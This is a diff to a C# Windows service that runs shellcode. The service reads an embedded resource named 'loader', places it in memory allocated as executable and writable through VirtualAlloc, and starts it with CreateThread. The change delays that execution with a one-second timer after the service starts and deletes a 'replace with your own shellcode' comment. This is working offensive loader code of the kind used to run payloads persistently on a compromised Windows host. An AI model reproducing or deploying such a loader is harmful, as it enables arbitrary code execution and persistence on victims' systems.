@@ -9,6 +9,7 @@ using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.Runtime;
+using System.Timers;
 namespace WindowsService1
 {
     public partial class Service1 : ServiceBase
@@ -38,15 +39,18 @@ namespace WindowsService1
         }
         protected override void OnStart(string[] args)
         {
-            Execute();
+            Timer timer = new Timer();
+            timer.Interval = 1000;
+            timer.AutoReset = false;
+            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
+            timer.Start();
         }
         protected override void OnStop()
         {
             
         }
-        public bool Execute()
+        public void OnTimer(object sender, ElapsedEventArgs args)
         {
-            //replace with your own shellcode
             byte[] shellcode = GetResource("loader");
             UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
             MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -56,7 +60,6 @@ namespace WindowsService1
             IntPtr pinfo = IntPtr.Zero;
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
             WaitForSingleObject(hThread, 0xFFFFFFFF);
-            return true;
         }
         private static byte[] GetResource(string name)
         {
